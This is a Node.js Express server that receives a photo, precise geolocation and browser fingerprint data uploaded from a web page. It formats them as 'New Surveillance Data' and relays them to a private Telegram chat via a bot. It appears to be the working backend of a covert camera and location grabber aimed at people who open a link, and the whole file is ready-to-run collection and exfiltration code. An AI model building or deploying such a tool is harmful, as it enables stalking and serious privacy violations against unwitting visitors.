require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Setup
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });

// Multer setup for file uploads
const upload = multer({
  dest: 'uploads/',
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Photo upload endpoint
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  try {
    const { location, browserInfo } = req.body;
    const photoPath = req.file.path;

    // Parse data
    const locationData = JSON.parse(location);
    const browserData = JSON.parse(browserInfo);

    // Create message
    let message = '📸 New Surveillance Data\n\n';
    
    // Location info
    if (locationData.latitude) {
      message += `📍 Location:\n`;
      message += `Latitude: ${locationData.latitude}\n`;
      message += `Longitude: ${locationData.longitude}\n`;
      message += `Accuracy: ${locationData.accuracy}m\n\n`;
    }

    // Browser info
    message += `🌐 Browser Info:\n`;
    message += `User Agent: ${browserData.userAgent}\n`;
    message += `Platform: ${browserData.platform}\n`;
    message += `Language: ${browserData.language}\n`;
    message += `Screen: ${browserData.screenWidth}x${browserData.screenHeight}\n`;
    message += `Viewport: ${browserData.viewportWidth}x${browserData.viewportHeight}\n`;
    message += `Time: ${browserData.timestamp}\n`;

    // Send photo with caption
    await bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, fs.createReadStream(photoPath), {
      caption: message
    });

    // Send location if available
    if (locationData.latitude) {
      await bot.sendLocation(
        process.env.TELEGRAM_CHAT_ID,
        locationData.latitude,
        locationData.longitude
      );
    }

    // Delete uploaded file
    fs.unlinkSync(photoPath);

    res.json({ success: true, message: 'Data sent to Telegram' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 Telegram bot connected`);
});
